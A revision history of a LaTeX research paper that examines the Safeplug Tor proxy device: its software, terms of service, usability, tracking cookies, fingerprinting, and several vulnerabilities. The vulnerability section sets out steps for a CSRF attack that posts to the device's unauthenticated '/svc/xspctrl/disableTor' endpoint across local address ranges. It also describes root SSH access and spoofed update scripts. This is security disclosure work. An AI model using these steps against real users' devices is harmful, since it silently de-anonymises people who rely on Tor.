 When Tor is turned on as a relay, port 9001 tor-orport is opened as well.
-This corresponds with the note on the settings page about Tor relays discussed in Section \ref{port9001} above.
+This corresponds with the note on the settings page about Tor relays discussed in Section \ref{port9001} below.
 
@@
 and \verb!sp_torexceptions!.
-The first contains all of the configuration details: whether to use Tor, whether to ad-block, and whether to be a relay or an exit relay.
+The first contains all of the configuration details: whether to use Tor, whether to block ads, and whether to act as a Tor relay or exit relay.
 The version file is used during the check for updates, and the exceptions file is used by the Privoxy configuation to control the whitelist of sites not to connect to via Tor.
@@
 As expected, Privoxy looks at the Tor, ad-block and exceptions configurations, and Tor reads the \verb!sp.conf!
-file to set which Tor configuration file (regular, relay, or exit relay) to use.
+file [to set which Tor configuration file (regular, relay, or exit relay) to use].
 
@@
 The Terms of Service (TOS) contains three main points of interest: TOS updates, open source licensing information, and software updates.
-First, the TOS are not presented to the user in the Safeplug package (the only information in the packaging were the instructions shown in Figure~\ref{fig:instructions}) or during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
+First, the TOS are never presented to the user: they aren't presented in the Safeplug package (the only information in the packaging were the instructions shown in Figure~\ref{fig:instructions}) or shown during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
 Although use of the Safeplug device purportedly constitutes acceptance of the TOS, most users are not likely to read the TOS even once.
-However, Pogoplug suggests that users regularly review the TOS because they can update or change them at any time; this is standard language in TOS but not a good combination with them not being presented to the user.
-
-Following good security and development practices, the Safeplug makes use of several pieces of Open Source software.
+However, Pogoplug suggests that users regularly review the TOS because they can update or change them at any time; this is standard language for TOS but not a good combination with them never being presented to the user.
+
+Following good security and development practices, the Safeplug makes use of several pieces of open source software.
 A standard term of many open source licenses states that a company that uses the open source software must list the software used and its license, as well as the open source code of their own software that uses the license.
-The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html} but the link is dead and instead the reader sees a 404 error \cite{safeplug}.
+The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html} but the link is dead; instead, the reader sees a 404 error \cite{safeplug}.
 This dead link was noted by some members of the Tor-talk mailing list in November 2013 and has not been fixed as of Feburary 2014 \cite{tormailinglist}.
-Pogoplug's open source page does exist at \url{https://pogoplug.com/opensource} and includes several pieces of software for the Safeplug: bootloader, Linux kernel, XCE kernel support driver, glibc, BusyBox, and a Safeplug source bundle.
-However, there is no way to find this page from the Terms of Service.
+Pogoplug does maintain an open source page at \url{https://pogoplug.com/opensource}, which describes several pieces of software for the Safeplug: the bootloader, Linux kernel, XCE kernel support driver, glibc, BusyBox, and a Safeplug source bundle.
+However, there is no way to find this page from the Terms of Service or the Safeplug website.
 
@@
 We followed them, activated our device, and then ended on the configurations page.
-The configurations page has a combination of platforms and browsers, shown in the table below, with a different set of proxy configuration instructions for each one.
-The platforms presented include popular desktop and mobile platforms.
+The configurations page shows a variety of platforms and browsers, shown in the table below, and links to proxy configuration instructions for each one.
+The platforms presented include many popular desktop and mobile platforms.
 For every browser on every client device that the user wants to protect, they must set up the Safeplug as the browser's HTTP proxy and ensure that the proxy stays set up when the browser is updated or re-installed.
@@
 
-After we finished our configuration, we were taken to the Safeplug settings page.
+After we finished configuring our Safeplug and browser, we were taken to the Safeplug settings page.
 This page is shown in Figure~\ref{fig:settings}.
-This page allows the user to set a number of options on the device, including turning Tor on/off, turning ad-blocking on/off, and turning relay node ability on/off (and if on, an additional option appeared to allow the device to be an exit node).
+This page allows the user to set a number of options on the device, including turning Tor on/off, turning ad-blocking on/off, and turning relay node ability on/off (and if on, an additional option appeared to allow the device to be an exit relay).
 Additionally, the user can specify ``white-listed'' domains that will be connected to directly even if Tor is turned on, without going through the Tor network.
@@
 ``Safeplug uses the Tor network to secure your Internet connection.
-Tor works by routing your Internet through a series of random destinations, much like driving a twisty, complicated route to throw off someone who is following you, making it impossible for websites and organizations to identify the source or destination of Internet traffic.'' \cite{safeplug}
+Tor works by routing your Internet through a series of random destinations, much like driving a twisty, complicated route to throw off someone who is following you, making it impossible for websites and organizations to identify the source or destination of Internet traffic.''
 \end{quotation}
@@
 \\ For help configuring your router, click here.''
-\cite{safeplug}
 \end{quotation}
@@
 Another consequence of misunderstanding the use of the Safeplug as a relay node, or more specifically, as an exit node is the possible legal repercussions.
-As an exit relay, all traffic that exits the node can be traced back to the Safeplug's IP address; it is likely that some of this traffic contains illegal information or is part of illegal activities.
+As an exit relay, all traffic that exits the node can be traced back to the Safeplug's IP address; it is likely that some of this traffic contains illegal information or is part of illicit activities.
 The Tor Project recommends not running an exit relay from a user's home: ``If law enforcement becomes interested in traffic from your exit relay, it's possible that officers will seize your computer.
-For that reason, it's best not to run your exit relay in your home or using your home Internet connection~\cite{law}.''  Considering that the Safeplug is intended for home use, it is a poor design choice to allow the user to use it as an exit relay, especially without providing the user with any information.
+For that reason, it's best not to run your exit relay in your home or using your home Internet connection~\cite{law}.''  Considering that the Safeplug is intended for home use, it is a poor design choice to allow the user to use it as an exit relay, especially without providing the user with any contextual information.
 
@@
 We experienced the same situation with Facebook and its corresponding ``like'' button.
-This was confirmed by using FourthParty, a plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data.
+This was confirmed by using FourthParty, a plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data~\cite{fourthparty}.
 
 This is clearly not the perfect ``anonymity'' that Safeplug promised in their publicity.
-Although normal use does follow this model of persisting logged in status across browser tabs and sessions, a user concerned about anonymity and seeing each session coming up differently (German vs Swedish) might mistakenly believe that they do not have to log out of their social media accounts to preserve their anonymity when accessing other websites.
+Although normal use does follow this model of persisting logged in status across browser tabs and sessions, a user concerned about anonymity and seeing each session coming up differently (e.g., German then Swedish) might mistakenly believe that they do not have to log out of their social media accounts to preserve their anonymity when accessing other websites.
 
 More interesting and damaging to the user's control over their anonymity would be third-party cookies because the user cannot remove those just by logging out.
-It requires a trip to the browser settings to clear cookies (or not have them set in the first place).
+Most browsers require a trip to the browser settings to clear cookies (or not have them set in the first place).
 We used FourthParty to analyze the client's use of the Safeplug \cite{fourthparty}.
@@
 \subsection{Browser Fingerprinting}
-We used Panopticlick to examine the fingerprint of a freshly installed Firefox browser running through the Safeplug proxy~\cite{panopticlick}.
+We used Panopticlick~\cite{panopticlick} to examine the fingerprint of a freshly installed Firefox browser running through the Safeplug proxy.
 Panopticlick found the browser to be unique, which means that websites that did fingerprinting could very accurately track, correlate, and de-anonymize user traffic without knowing the IP address or even storing a cookie.
-The presence of the Safeplug, as an HTTP proxy, should be completely undetectable by the fingerprinting service by the design of HTTP making proxies transparent.
+The presence of the Safeplug, as an HTTP proxy, should be completely undetectable by the fingerprinting service because HTTP is designed to make proxies transparent.
 Unlike the Tor Browser Bundle, Safeplug users do not even have the fingerprints of other users of the service to help hide their fingerprints.
@@
 
-\section{Implementing Attacks}
-As we discovered during the software analysis, the Safeplug has a remote procedure call (RPC) capability.
-This is a script called \verb!xspctrl!
-found in \verb!/opt/xce/html/svc!
-and it contains various options.
+\section{Vulnerabilities}
+As we discovered during our software analysis, the Safeplug has a remote procedure call (RPC) capability.
+Implemented is a script called \verb!xspctrl!
+found in \verb!/opt/xce/html/svc!.
 Particularly, functional calls to this script include the ability to enable and disable for all of the Safeplug settings, including Tor, ad block, and Tor relay.
@@
   \includegraphics[width=.75\textwidth]{disabletor}
-  \caption{Disabling Tor as an insider attack.}
+  \caption{Disabling Tor as an RPC attack.}
   \label{disable}
@@
 \subsection{Insider Attack}
-Since the Safeplug has no validation or authentication on the settings page or these RPC calls, any malicious party inside the home network could easily modify the settings.
-Such an adversary with a computer could load the Safeplug's settings page and adjust options such as disabling Tor or adding a site to the whitelist; since this page is meant to be accessible to normal Internet users, anyone can perform this attack.
+Since the Safeplug has no validation or authentication on the settings page or these RPC calls, any malicious party inside the home network can easily modify the settings.
+Such an adversary with a computer could load the Safeplug's settings page and adjust options such as disabling Tor or adding a site to the whitelist; since this page is meant to be accessible to normal Internet users, anyone inside the network can perform this attack.
 Unlike many home routers, there is no username/password combination necessary to access this page.
@@
 Since the RPC version of the attack just involves basic Internet tools (the ability to send a POST request), the attacker could also be any kind of device on the local network, or the local gateway if it is compromised.
-The NSA ``Spymall'' catalog leaked in December shows tools for compromising a number of different devices and home routers are traditionally insecure \cite{spymall}.
+The NSA ``Spymall'' catalog \cite{spymall} leaked in December shows tools for compromising a number of different devices and home routers are particularly insecure.
 It is easy to imagine any malicious party, not just one with the resources of a government (although governments might be some of the most interested parties in attacking a Tor proxy), compromising the gateway and using that access to make a disabling RPC call into the Safeplug.
@@
 If not, perhaps there is some authentication protocol that could be implemented.
-The challenge of such a protocol from a user's point of view is that valid access would be infrequent so giving a user a password to remember would be a poor experience.
+The challenge of such a protocol from a user's point of view is that valid access would be infrequent so giving a user a password to remember would lead to a poor experience.
 
 \subsection{CSRF Attack}
-An external website can also perform this attack by returning a correctly formatted POST string via an internal user's browser.
+Any external website can also perform the above attack by returning a correctly formatted POST string via an internal user's browser.
 This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network or know the IP address of the Safeplug.
@@
 In addition to disabling Tor, the attacker can modify any other settings on the device.
-This includes: enabling/disabling Tor, enabling/disabling ad-blocking, enabling/disabling the use of the device as a Tor relay node [note: this requires the user to do additional setup], enabling/disabling the use of the device as an exit node (if it is already a relay).
+This includes: enabling/disabling Tor, enabling/disabling ad-blocking, enabling/disabling the use of the device as a Tor relay node [note: enabling requires the user to do additional setup], enabling/disabling the use of the device as an exit node (if it is already a relay).
 Lastly, the attacker can also modify the user's whitelist of sites that should not be routed through Tor.
@@
 
-Having a publically available root password means that SSH can be done effectively without authentication.
+Having a publically available root password means that SSH is done effectively without authentication.
 We tried the SSH procedure twice, once before the Internet connection and activation, and once afterwards.

### 2014-03-06 w2sp/report.tex
some minor fixes

@@
 folder of the root filesystem and includes Lighttpd, Privoxy, and Tor.
+
 Lighttpd is an open-source web-server, which serves the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
@@
 However, checking for an update from the Safeplug does not lead to any updated software installation.
-
 Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removing ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.
@@
 The version on the device is 3.0.21, which is the most recent release.
-%%% TODO: More about functionality, or comparison with AdBlock?
-How does it get its filter lists?
-
 The version of Tor is v0.2.3.25 from November 2012.
@@
 
-The fourth piece of software the device, which is not installed during the activation process and is in \verb!/usr/sbin!
-is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.
+The fourth piece of software the device, which is not installed during the activation process and is in a different location (\verb!/usr/sbin!) is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.
 The Safeplug uses its own configuration files to determine how these pieces of software are set up and used.
@@
 We used \texttt{nmap} to scan the ports.
-Before the activation of the Safeplug, only ports 80 and 3333 are open.
+Before the activation of the Safeplug, only ports 80 (HTTP) and 3333 (unknown purpose) are open.
 After the activation, without the use of Tor turned on, port 22 for SSH, port 80 for settings access and port 8080 for http-proxy are open.
-When Tor is turned on as a relay, port 9001 tor-orport is opened as well.
+When Tor is turned on as a relay, port 9001 is opened as well.
 This corresponds with the note on the settings page about Tor relays discussed in Section \ref{port9001} below.
@@
 The first contains all of the configuration details: whether to use Tor, whether to block ads, and whether to act as a Tor relay or exit relay.
-The version file is used during the check for updates, and the exceptions file is used by the Privoxy configuation to control the whitelist of sites not to connect to via Tor.
+The version file is used during the call to check for updates in the \verb!xspctrl!
+script, and the exceptions file is used by the Privoxy configuation to control the whitelist of sites not to connect to via Tor.
 
@@
 \section{Usability}
-Several aspects of the user experience of the Safeplug affect the usability and security of the device.  The Safeplug advertisements highlighted the ease of setup and activation of the device.
+Several aspects of the user experience of the Safeplug also affect the security of the device.  The Safeplug advertisements highlighted the ease of use, but omit important details.
 
@@
   \centering
-  \includegraphics[width=.7\textwidth]{settings_with_exit}
+  \includegraphics[width=.65\textwidth]{settings_with_exit}
   \caption{Safeplug settings page.  The last button ``Allow Exit'' only appears if the relay option above has been turned on.}
@@
 
-On the other hand, it describes the functionality of a Tor relay node in a much more technical manner:
+On the other hand, it assumes a much higher level of knowledge about networks for users trying to configure a relay:
 \begin{quotation}
-``Make the Tor network strong for everybody!
-Enabling Tor Relay allows your Safeplug to act as a relay point on the Tor network.
-The more Tor relays that join the Tor network, the faster and more robust Tor becomes, helping everybody be more secure online.
-\\ \\ NOTE: You must forward inbound traffic on port 9001 to [IP-of-Safeplug].
-\\ For help configuring your router, click here.''
+NOTE: You must forward inbound traffic on port 9001 to [IP-of-Safeplug]. \\ For help configuring your router, click here.''
 \end{quotation}
@@
 The link provided is to an advertisement-filled and not particularly reputable-looking website with no clear navigation to get to the necessary instructions.
-
-If the majority of users can only understand the simpler description, then they likely won't understand the description of a Tor relay node.
-This could be a problem if users simply decide not to do anything with that setting (i.e.
-don't change the setting to use the Safeplug as a relay node).
-In this case, there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.
-
-This could easily be remedied; Safeplug should choose a target audience and have consistent descriptions.
-The best option is to explain the Tor network and the functionality of a Tor relay node at the same level, preferably a level that normal Internet users can understand.
+Without clear guidance, many users will leave the setting in its default, non-relay state, which would cause a there would be a large increase in load on the Tor network, without a comparable increase in its ability to support more load.
+The technical barrier could be easily overcome; Safeplug should choose a target audience and have consistent descriptions.
+The best option is to explain the Tor network and the functionality of a Tor relay node at the same accessible level.
 This increases the chances that users will run their Safeplug as a relay node.
@@
 
-It is interesting to note that the average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
+It is interesting that the average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
 This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad; \url{www.google.com} does not have any ads.
@@
 Instead, the client would continue browsing with a belief that they are protected by their use of the Tor network, while in fact any external adversary can track their traffic.
-
-This seems like a fairly important vulnerability and requires action from Pogoplug to fix.
-Since the purpose of these RPC operations is unclear without access to more of the source code, it is possible that they could be disabled entirely.
-If not, perhaps there is some authentication protocol that could be implemented.
-The challenge of such a protocol from a user's point of view is that valid access would be infrequent so giving a user a password to remember would lead to a poor experience.
+This is a critical vulnerability and requires action from Pogoplug to fix.
 
@@
 We tried the SSH procedure twice, once before the Internet connection and activation, and once afterwards.
-Before the activation and update procedure, SSH was not available.
-The simple \verb!Hbplug!
-software on the box could not accept this RPC call.
-However, once the box was updated and had Lighttpd installed, the SSH procedure was available and we could download the contents of the root filesystem for analysis.
+Before the activation and update procedure, SSH was not available because the RPC server code was not running without Lighttpd being installed.
+However, once the box was updated and had Lighttpd installed, the SSH procedure was available and any adversary on the home network could log into the box and install malware, surveillance software, or virtually anything they desired.
 

### 2014-03-06 w2sp/report.tex
merging

--- 2014-03-05 w2sp/report.tex
@@
 \item The Safeplug functions as a HTTP proxy for the browser, which then uses Tor for outgoing traffic (see Figure \ref{fig:flow}).
-\item Despite the use of Privoxy as an ad-blocker, the Safeplug does nothing to prevent users' browsers from collecting both first- and third-party tracking cookies, allowing users to be de-anonymized across websites despite the presence of Tor.%\cite{arvindpets}.
+\item Despite the use of Privoxy as an ad-blocker, the Safeplug does nothing to prevent users' browsers from collecting both first- and third-party tracking cookies, allowing users to be de-anonymized across websites despite the presence of Tor~\cite{arvindpets}.
 \item Safeplug users are vulnerable to a Cross-Site Request Forgery (CSRF) attack that allows an attacker external to their home network to modify the Safeplug settings (including silently turning off the use of Tor).
@@
 
-%\begin{table}[!t]
-%\renewcommand{\arraystretch}{1.3}
-%\caption{The platforms and browsers that the Safeplug settings page provides instructions for.}
-%\label{table_example}
-%\centering
+\begin{table*}[!t]
+\renewcommand{\arraystretch}{1.3}
+\caption{The platforms and browsers that the Safeplug settings page provides instructions for.}
+\label{table_example}
+\centering
+	\begin{tabular}{|c|c|}
+	\hline
+		Platform & Browsers \\ \hline
+		Windows	& Internet Explorer, Chrome, Firefox \\ \hline
+		OSX & Safari, Chrome, Firefox \\ \hline
+		iOS	& Safari \\ \hline
+		Android	& Chrome \\ \hline
+	\end{tabular}
+\end{table*}
+
+%\begin{center}
 %	\begin{tabular}{|c|c|}
@@
 %	\end{tabular}
-%\end{table}
-
-\begin{center}
-	\begin{tabular}{|c|c|}
-	\hline
-		Platform & Browsers \\ \hline
-		Windows	& Internet Explorer, Chrome, Firefox \\ \hline
-		OSX & Safari, Chrome, Firefox \\ \hline
-		iOS	& Safari \\ \hline
-		Android	& Chrome \\ \hline
-	\end{tabular}
-\end{center}
+%\end{center}
 
@@
 
-If the majority of users can only understand the simpler description, then they likely won't understand the description of a Tor relay node.
+The two descriptions are targeting two different audiences: one with much more knowledge about technology and Tor, the other with much less knowledge of these topics.
+It is likely that at least one of these audiences will not understand one of the descriptions.
 This could be a problem if users simply decide not to do anything with that setting (i.e.
@@
 Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
-Both of these figures show our IP address in the top right corner; due to the change in IP address we can see that our traffic is being routed through Tor.
+Both of these figures show our IP address in the top right corner; we can see that our traffic is being routed through Tor due to the change in IP address.
 
@@
 
+\bibitem{arvindpets} Reisman, Dillon and Englehardt, Steven and Eubank, Christian and Zimmerman, Peter and Narayanan, Arvind.
+``Cookies that give you away: Evaluating the surveillance implications of web tracking.'' \emph{Manuscript}.
+2014.
+
 \bibitem{kernelcve} Security Database. ``Linux Linux Kernel 2.6.13.8 CVE'' \url{http://www.security-database.com/cpe.php?detail=cpe:/o:linux:linux_kernel:2.6.31.8}

### 2014-03-06 w2sp/report.tex
shortening the paper

@@
 However there has been much prior research on the primary technology that the device uses: Tor.
-Additionally, the security vulnerabilities that Safeplug attempts to secure users against have been previously studied in great detail; these include fingerprinting and cookies.
+Additionally, a security vulnerability that Safeplug attempts to secure users against has been previously studied in great detail: fingerprinting.
 
@@
 
-{\bf Cookies} There has been much policy and technology debate around the topic of third-party web tracking.
+%{\bf Cookies} There has been much policy and technology debate around the topic of third-party web tracking.
 Mayer and Mitchell survey recent policy and technology stances on web tracking; while tracking allows for free web content and innovation, it compromises a user's privacy~\cite{commercial2}.

### 2014-03-06 w2sp/report.tex
adding Anna's changes

--- 2014-03-06 w2sp/report.tex
@@
 When a user modifies the settings page, Javascript on the settings page generates a POST request to {\tt xspctrl}, which is a script running via CGI in Lighttpd.
-The CGI handler copies a number of environment variables from, and then forks and runs {\tt xspctrl} via {\tt execve} (in the constructed environment).
-{\tt xspctrl} is a shell script which dispatches the correct method to run and executes any of the necessary binary files with specified arguments (go\_update, go\_upgrade, go\_sshd, or go\_updateexceptions) to complete its request before returning a response.
+The CGI handler copies a number of environment variables, and then forks and runs {\tt xspctrl} via {\tt execve} (in the constructed environment).
+{\tt xspctrl} is a shell script with a method for each settings change; these methods execute any necessary Safeplug binary files (go\_update, go\_upgrade, go\_sshd, or go\_updateexceptions) and then return a HTTP response.
 
@@
 script, and the exceptions file is used by the Privoxy configuation to control the whitelist of sites not to connect to via Tor.
-
 These configuration files are read by the scripts in \verb!/opt/xce/etc/init.d!
 which enable Lighttpd, Privoxy, and Tor.
-As expected, Privoxy looks at the Tor, ad-block and exceptions configurations, and Tor reads the \verb!sp.conf!
-file [to set which Tor configuration file (regular, relay, or exit relay) to use].
+As expected, Privoxy looks at the \verb!tor!, \verb!ad-block!
+and \verb!exceptions!
+configurations, and Tor reads the \verb!sp.conf!
+file to determine the correct Tor configuration file (regular, relay, or exit relay).
 
@@
 Additionally, the user can specify ``white-listed'' domains that will be connected to directly even if Tor is turned on, without going through the Tor network.
-The Safeplug FAQ website describes this as an option for bank websites or other sites that might completely prevent logons from foreign IP addresses\cite{safeplug}.
+The Safeplug FAQ website describes this as an option for sites like banks that prevent access from foreign IP addresses\cite{safeplug}.
 
@@
 \begin{quotation}
-NOTE: You must forward inbound traffic on port 9001 to [IP-of-Safeplug]. \\ For help configuring your router, click here.''
+You must forward inbound traffic on port 9001 to [IP-of-Safeplug]. For help configuring your router, click here.''
 \end{quotation}
@@
 
-Figure~\ref{fig:before} shows what a web page looks like before turning Tor and ad-blocking on, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
-Both of these figures show our IP address in the top right corner; we can see that our traffic is being routed through Tor due to the change in IP address.
-
-Next, we wanted to see how usable this would be to a normal Internet user.
-A user would probably decide not to use Safeplug if they could not read their web pages (if they were not in their native language), or if they could not log into their accounts (some web sites will lock a user out if they try to log in from multiple countries in a short time period).
-While browsing the Internet, we experienced some pages in German and Swedish, which is expected with Tor; if a user is not familiar with Tor, they may get frustrated and stop using Safeplug altogether.
+Figure~\ref{fig:before} shows a web page before using Tor or ad-blocking, while Figure~\ref{fig:after} shows the same website after turning Tor and ad-blocking on.
+Both of these figures show the IP address in the top right corner; we can see that the traffic is being routed through Tor due to the change in IP address.
+
+Next, we examined popular webpages, with an eye for changes in the user experience.
+A user would probably decide not to use Safeplug if they could not read their web pages (due to a different language), or if they could not log into their accounts (some web sites will lock a user out if they try to log in from multiple countries in a short time period).
+While browsing the Internet, we experienced some pages in German and Swedish; if a user is not familiar with Tor, they may not understand why this is happening.
 We were also prompted with a request to ``Enter the name of the city where you usually sign in'' when we tried to log into our Google account, indicating that Google noticed we were trying to login from significantly ``unusual'' location.
@@
 \subsection{Cookies}  
-While browsing the Internet, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ widget in a different tab.
+While browsing the Internet in a fresh browser session, we logged into a Google Account in a tab, and then subsequently went to a website that had the Google+ widget in a different tab.
 When we clicked on the Google+ widget, it remember who we are; so we can confirm that a cookie associated with the login was sent to the second Google+ page.
 We experienced the same situation with Facebook and its corresponding ``like'' button.
-This was confirmed by using FourthParty, a plugin developed by Jonathan Mayer at Stanford to collect information about cookies and other browsing data~\cite{fourthparty}.
+This was confirmed by using FourthParty, a plugin developed by Jonathan Mayer to collect information about cookies and other browsing data~\cite{fourthparty}.
 
@@
 
-\begin{itemize}
-\item Plain Firefox (traffic not running through the Safeplug device)
+\begin{itemize} %\setlength{\itemsep}{2mm}
+\item Plain Firefox (no use of the Safeplug device)
 \item Firefox, no Tor, no ad-blocking (traffic running through the Safeplug device)
@@
 \item Firefox, no Tor, ad-blocking
-\item Tor Browser Bundle with Safeplug (all settings turned off)
+\item Tor Browser Bundle with Safeplug (all settings off)
 \item Tor Browser Bundle
@@
 
-It is interesting that the average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
-This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad; \url{www.google.com} does not have any ads.
-This also explains why the average latency was greater than the other settings for \url{www.washingtonpost.com}: each ad was requested through Tor.
+The average web request time for accessing \url{www.washingtonpost.com} is greatest on the same settings that the average web request time for \url{www.google.com} is the least.
+This setting did not include ad-blocking, and therefore \url{www.washingtonpost.com} had to render each ad (which it requested through Tor); \url{www.google.com} does not have any ads.
 
@@
 \subsection{Insider Attack}
-Since the Safeplug has no validation or authentication on the settings page or these RPC calls, any malicious party inside the home network can easily modify the settings.
+The Safeplug has no validation or authentication on the settings page or these RPC calls, any malicious party inside the home network can easily modify the settings.
 Such an adversary with a computer could load the Safeplug's settings page and adjust options such as disabling Tor or adding a site to the whitelist; since this page is meant to be accessible to normal Internet users, anyone inside the network can perform this attack.
@@
 Figure \ref{disable} shows an example of the RPC version of this attack.
-
-Since the only form of authentication is access to the home network, if the adversary can get into the network they can perform these attacks.
+If the adversary can get into the network they can perform these attacks.
 For example, if the user has an open WiFi network, then anyone nearby can launch this attack - potentially peforming a sort of drive-by deanonymization.
@@
 This executes the same functionality as the Insider Attack, but the attacker does not need to be on the local network or know the IP address of the Safeplug.
-The CSRF attack requires a nonmalicious insider user to visit a web page controlled by the attacker; additionally, the attacker must target the POST to the IP address of the Safeplug, but the attacker can get the right address by an exhaustive search.
+This Cross Site Request Forgery (CSRF) attack requires a nonmalicious insider user to visit a web page controlled by the attacker, allowing the attacker to send the POST to the Safeplug by performing an exhaustive search on the address space.
 We implemented this attack with less than 20 lines of Javascript code.
-The following steps are necessary for the attack to be successful:
+The following steps are necessary for the attack:
 
 \begin{enumerate}
-\item Set up a web page with the crafted Javascript code, which will send the POST request of the following format to all addresses in the common ranges: \url{http://<IP address>/svc/xspctrl/disableTor}.
+\item Set up a web page with the Javascript code, which will send the POST request of the following format to all addresses in the common ranges: \url{http://<IP address>/svc/xspctrl/disableTor}.
 \item Send the malicious link to a user in the targeted private network.
 \item Once the user clicks the link and loads the malicious site, the correctly formatted POST request will be sent to every IP address in the ranges.  
-\item Tor is disabled silently.  The user must check or refresh her settings page to learn that Tor is turned off.  
+\item Tor is disabled silently.  The user must check or refresh her settings page to learn that Tor is off.  
 \end{enumerate}
@@
 This whitelist attack is particularly dangerous because the change is silent and much harder for the user to notice the addition of a single website to the whitelist than a global loss of Tor.
-(Removal of a webpage from the whitelist is likely to cause usability problems and be more evident.)
+(Removal of a webpage from the whitelist is likely to produce visible usability problems.)
 
@@
     Another command available to the RPC server is enabling SSH to the device.
-SSH instructions for Pogoplug's other device (called Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same \cite{ceadmin}:
+SSH instructions for Pogoplug's other device (called Pogoplug) are widely available online and an email in the Tor-talk mailing list confirmed the instructions \cite{ceadmin}:
 \begin{lstlisting}
@@
 
-Having a publically available root password means that SSH is done effectively without authentication.
+Having a publicly available root password means that SSH is done effectively without authentication.
 We tried the SSH procedure twice, once before the Internet connection and activation, and once afterwards.
@@
 \label{dnsspoof}
-A more dangerous class of vulnerabilities comes from the fact that the update process happens over insecure TCP rather than any kind of encrypted process.
+An additional dangerous class of vulnerabilities comes from the the use of insecure TCP rather than any kind of encrypted communication during the update process.
 During our network analysis of the activation process, we discovered that the update script is downloaded via TCP from an IP address provided by the Pogoplug servers.
-This update script (run as root) then downloads the Safeplug's software (Tor, Privoxy, Lighttpd, and wget) and checks it against MD5 hashes, but it is not clear whether there is suitable verification of the update script itself.
-An adversary could use DNS spoofing or compromise the Pogoplug server in order to force users to download a malicious update script - for example, something that turns the Safeplug into a surveillance box while appearing to provide the correct functionality.
-Since the most efficient way to check this would be to verify the contents of the Safeplug box itself by SSHing in, it is clear that any kind of mitigation to this attack would be beyond an average user.
-Because the activation occurs over TCP rather than anything more secure, an adversary who can spoof DNS replies to the user has a paved gateway into the Safeplug box.
+This update script (run as root) then downloads the Safeplug's software (Tor, Privoxy, Lighttpd, and wget) and checks it against MD5 hashes, but it is not clear whether there is verification of the update script itself.
+An adversary could use DNS spoofing or compromise the Pogoplug server and force users to download a malicious update script - for example, something that turns the Safeplug into a surveillance box while appearing to provide the correct functionality.
+The most efficient way to check this would be to verify the contents of the Safeplug box itself by SSHing in; therefore, any kind of detection or mitigation would be beyond an average user.
+Because the activation occurs over TCP rather than anything more secure, an adversary who can spoof DNS replies to the user can install arbitrary software onto the Safeplug box.
 This turns a device that does not live up to expectations, but is otherwise harmless, into something that actively harms security on the network.
@@
 For them, is the benefit of some anonymity via a Safeplug-like device worthwhile?
-Since the data sent by these devices to the service provider likely contains identifying information, the use of Tor probably only protects the user's location at the expense of connection time and load on the Tor network.
-Since proxy configuration on such devices is likely to be difficult and the amount of information hidden is unlikely to be worth the effort, a Torifying box that functions as a proxy has questionable use in this space as well.
+Since the data sent by these devices to the service provider likely contains identifying information, the use of Tor would only protect the user's location at the expense of connection time and load on the Tor network.
+Since proxy configuration on such devices is likely to be difficult and the amount of information hidden is unlikely to be worth the effort, a Torifying box that functions as a proxy is of questionable value in this space as well.
 

### 2014-04-21 foci/paper.tex
new folder for FOCI paper

--- 2014-03-06 w2sp/report.tex
@@
-% Also note that the "draftcls" or "draftclsnofoot", not "draft", option
-% should be used if it is desired that the figures are to be displayed in
-% draft mode.
-%
-\documentclass[conference]{IEEEtran}
-\makeatletter
-\long\def\@makecaption#1#2{\ifx\@captype\@IEEEtablestring%
-\footnotesize\begin{center}{\normalfont\footnotesize #1}\\
-{\normalfont\footnotesize\scshape #2}\end{center}%
-\@IEEEtablecaptionsepspace
-\else
-\@IEEEfigurecaptionsepspace
-\setbox\@tempboxa\hbox{\normalfont\footnotesize {#1.}~~ #2}%
-\ifdim \wd\@tempboxa >\hsize%
-\setbox\@tempboxa\hbox{\normalfont\footnotesize {#1.}~~ }%
-\parbox[t]{\hsize}{\normalfont\footnotesize \noindent\unhbox\@tempboxa#2}%
-\else
-\hbox to\hsize{\normalfont\footnotesize\hfil\box\@tempboxa\hfil}\fi\fi}
-\makeatother
-% Add the compsoc option for Computer Society conferences.
-%
-% If IEEEtran.cls has not been installed into the LaTeX system files,
-% manually specify the path to it like:
-% \documentclass[conference]{../sty/IEEEtran}
+% TEMPLATE for Usenix papers, specifically to meet requirements of
+%  USENIX '05
+% originally a template for producing IEEE-format articles using LaTeX.
+%   written by Matthew Ward, CS Department, Worcester Polytechnic Institute.
+% adapted by David Beazley for his excellent SWIG paper in Proceedings,
+%   Tcl 96
+% turned into a smartass generic template by De Clarke, with thanks to
+%   both the above pioneers
+% use at your own risk.  Complaints to /dev/null.
+% make it two column with no page numbering, default is 10 point
 
-% Some very useful LaTeX packages include:
-% (uncomment the ones you want to load)
+% Munged by Fred Douglis <douglis@research.att.com> 10/97 to separate
+% the .sty file from the LaTeX source template, so that people can
+% more easily include the .sty file into an existing document.  Also
+% changed to more closely follow the style guidelines as represented
+% by the Word sample file.
 
-% *** MISC UTILITY PACKAGES ***
-%
-%\usepackage{ifpdf}
-% Heiko Oberdiek's ifpdf.sty is very useful if you need conditional
